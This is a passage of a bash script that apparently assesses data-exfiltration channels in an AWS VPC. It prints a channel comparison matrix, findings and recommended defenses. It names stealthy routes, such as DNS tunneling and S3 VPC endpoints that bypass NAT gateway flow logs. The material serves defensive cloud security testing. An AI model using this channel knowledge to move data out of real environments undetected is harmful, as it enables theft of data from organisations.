echo -e "  - IMDSv1 has no authentication — any process (or SSRF) can read all paths"
echo -e "  - IMDSv2 requires a PUT-based token; SSRF using GET cannot obtain it"
echo -e "  - Even without IAM credentials, instance metadata enables detailed recon"
echo -e "  - Defense: enforce IMDSv2 with http_tokens = 'required' in Terraform"
echo ""

# =============================================================================
# Step 6: Channel Comparison Matrix
# =============================================================================
print_header "Step 6: Data Exfiltration Channel Comparison Matrix"

result_text+=$'\n'"=== Step 6: Channel Comparison Matrix ==="$'\n'

echo -e "${BOLD}  ════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  Data Exfiltration Channel Matrix (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}  ════════════════════════════════════════════════════════════════════════════${NC}"
echo ""
printf "  %-18s %-11s %-14s %-10s %-10s %-10s\n" "Channel" "Available" "Bandwidth" "Stealth" "Config A" "Config B"
echo -e "  ──────────────────────────────────────────────────────────────────────────"

# HTTP/HTTPS row
if [[ "${HTTP_STATUS}" == "OPEN" ]]; then
    http_avail="${RED}YES${NC}"
elif [[ "${HTTP_STATUS}" == "PARTIAL" ]]; then
    http_avail="${YELLOW}PARTIAL${NC}"
elif [[ "${HTTP_STATUS}" == "BLOCKED" ]]; then
    http_avail="${GREEN}NO${NC}"
else
    http_avail="${YELLOW}UNKNOWN${NC}"
fi
printf "  %-18s " "HTTP/HTTPS"
echo -e "${http_avail}        High (MB/s)   Low       Same      Same"

# DNS row
if [[ "${DNS_STATUS}" == "OPEN" ]]; then
    dns_avail="${RED}YES${NC}"
elif [[ "${DNS_STATUS}" == "LIKELY-OPEN" ]]; then
    dns_avail="${YELLOW}LIKELY${NC}"
else
    dns_avail="${GREEN}NO${NC}"
fi
printf "  %-18s " "DNS Tunneling"
echo -e "${dns_avail}      Low (KB/s)    High      Same      Same"

# S3 row
if [[ "${S3_STATUS}" == "OPEN" ]]; then
    s3_avail="${RED}YES*${NC}"
elif [[ "${S3_STATUS}" == "RESTRICTED" ]]; then
    s3_avail="${YELLOW}PARTIAL${NC}"
elif [[ "${S3_STATUS}" == "BLOCKED" ]]; then
    s3_avail="${GREEN}NO${NC}"
else
    s3_avail="${YELLOW}UNKNOWN${NC}"
fi
printf "  %-18s " "S3 VPC Endpoint"
echo -e "${s3_avail}     Very High     Medium    Same      Same"

# ICMP row
if [[ "${ICMP_STATUS}" == "PROBABLE" ]]; then
    icmp_avail="${YELLOW}PROBABLE${NC}"
else
    icmp_avail="${YELLOW}TBD${NC}"
fi
printf "  %-18s " "ICMP Tunneling"
echo -e "${icmp_avail}    Very Low (KB/s) High    Same      Same"

# IMDS row
if [[ "${IMDS_STATUS}" == "VULNERABLE" ]]; then
    imds_avail="${RED}YES${NC}"
elif [[ "${IMDS_STATUS}" == "PARTIAL" ]]; then
    imds_avail="${YELLOW}PARTIAL${NC}"
elif [[ "${IMDS_STATUS}" == "BLOCKED" ]]; then
    imds_avail="${GREEN}NO${NC}"
else
    imds_avail="${YELLOW}UNKNOWN${NC}"
fi
printf "  %-18s " "IMDS Leakage"
echo -e "${imds_avail}        N/A (fixed)   N/A       Same      Same"

echo -e "  ──────────────────────────────────────────────────────────────────────────"
echo -e "  ${YELLOW}* Requires IAM credentials with S3 access + default VPC Endpoint policy${NC}"
echo ""

result_text+="Channel Matrix:"$'\n'
result_text+="  HTTP/HTTPS:      ${HTTP_STATUS}    | High (MB/s)   | Low    | Same | Same"$'\n'
result_text+="  DNS Tunneling:   ${DNS_STATUS} | Low (KB/s)    | High   | Same | Same"$'\n'
result_text+="  S3 VPC Endpoint: ${S3_STATUS}  | Very High     | Medium | Same | Same"$'\n'
result_text+="  ICMP Tunneling:  ${ICMP_STATUS}         | Very Low      | High   | Same | Same"$'\n'
result_text+="  IMDS Leakage:    ${IMDS_STATUS} | N/A (fixed)   | N/A    | Same | Same"$'\n'

# --- Key findings ---
echo -e "${BOLD}  Key Findings:${NC}"
echo ""
echo -e "  1. ${RED}Config B does NOT reduce exfiltration channel availability${NC}"
echo -e "     NAT GW routes outbound traffic but applies no content filtering."
echo ""
echo -e "  2. ${YELLOW}NAT GW consolidates all outbound to a single EIP${NC}"
echo -e "     This makes monitoring easier (single IP to watch) but does not block anything."
echo ""
echo -e "  3. ${RED}S3 VPC Endpoint bypasses NAT GW entirely${NC}"
echo -e "     Traffic goes VPC -> S3 directly; not visible in NAT GW Flow Logs."
echo -e "     A default endpoint policy makes every S3 bucket in any account reachable."
echo ""
echo -e "  4. ${RED}DNS exfiltration bypasses most network controls${NC}"
echo -e "     UDP 53 is almost universally allowed; DNS traffic is rarely inspected."
echo ""
echo -e "  5. ${CYAN}Only egress filtering closes these channels:${NC}"
echo -e "     - VPC Network Firewall with domain allowlisting"
echo -e "     - Route 53 Resolver DNS Firewall"
echo -e "     - Restrictive S3 VPC Endpoint policy (own account/bucket only)"
echo -e "     - Outbound Security Group: 443 to trusted CIDRs only"
echo -e "     - AWS Macie + S3 Object-level CloudTrail for detection"
echo ""

result_text+=$'\n'"Key Findings:"$'\n'
result_text+="1. Config B does NOT reduce exfiltration channel availability"$'\n'
result_text+="2. NAT GW consolidates outbound to single EIP (easier monitoring, no filtering)"$'\n'
result_text+="3. S3 VPC Endpoint bypasses NAT GW — not visible in NAT GW Flow Logs"$'\n'
result_text+="4. DNS exfil bypasses most network controls (UDP 53 universally allowed)"$'\n'
result_text+="5. Defenses: Network Firewall, DNS Firewall, restricted SG, S3 endpoint policy, Macie"$'\n'

# --- Overall verdict ---
open_channels=0
[[ "${HTTP_STATUS}" == "OPEN" ]]      && open_channels=$(( open_channels + 1 ))
[[ "${DNS_STATUS}" == "OPEN" ]]       && open_channels=$(( open_channels + 1 ))
[[ "${S3_STATUS}" == "OPEN" ]]        && open_channels=$(( open_channels + 1 ))
[[ "${ICMP_STATUS}" == "PROBABLE" ]]  && open_channels=$(( open_channels + 1 ))
[[ "${IMDS_STATUS}" == "VULNERABLE" ]] && open_channels=$(( open_channels + 1 ))

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  Overall Verdict (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  Confirmed/probable open channels: ${open_channels}"
echo -e "  IMDS total bytes exposed:         ${IMDS_TOTAL_BYTES}"
echo ""

if [[ ${open_channels} -ge 3 ]]; then
    print_vulnerable "CRITICAL — ${open_channels} exfiltration channels open; data egress unrestricted"
    result_text+="Overall verdict: VULNERABLE — ${open_channels} channels open"$'\n'
elif [[ ${open_channels} -ge 1 ]]; then
    print_vulnerable "HIGH — ${open_channels} exfiltration channel(s) confirmed; egress filtering recommended"
    result_text+="Overall verdict: HIGH — ${open_channels} channel(s) open"$'\n'
else
    print_blocked "LOW — No exfiltration channels confirmed open (verify egress filtering is in place)"
    result_text+="Overall verdict: LOW — No channels confirmed open"$'\n'
fi

echo ""
echo -e "${BLUE}[*] Recommended next steps:${NC}"
echo -e "  1. Deploy VPC Network Firewall with strict domain allowlist"
echo -e "  2. Enable Route 53 Resolver DNS Firewall"
echo -e "  3. Restrict S3 VPC Endpoint policy to own account buckets only"
echo -e "  4. Tighten outbound SG: allow only 443 to specific known CIDRs"
echo -e "  5. Enable AWS Macie for S3 data classification and anomaly detection"
echo -e "  6. Enforce IMDSv2 (http_tokens = 'required') to cut IMDS attack surface"
echo ""

result_text+=$'\n'"Recommended defenses:"$'\n'
result_text+="1. VPC Network Firewall (domain allowlisting)"$'\n'
result_text+="2. Route 53 Resolver DNS Firewall"$'\n'
result_text+="3. Restricted S3 VPC Endpoint policy"$'\n'
result_text+="4. Restrictive outbound Security Group (443 to known CIDRs)"$'\n'
result_text+="5. AWS Macie + S3 CloudTrail object logging"$'\n'
result_text+="6. Enforce IMDSv2"$'\n'

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "Data exfiltration channel analysis complete"
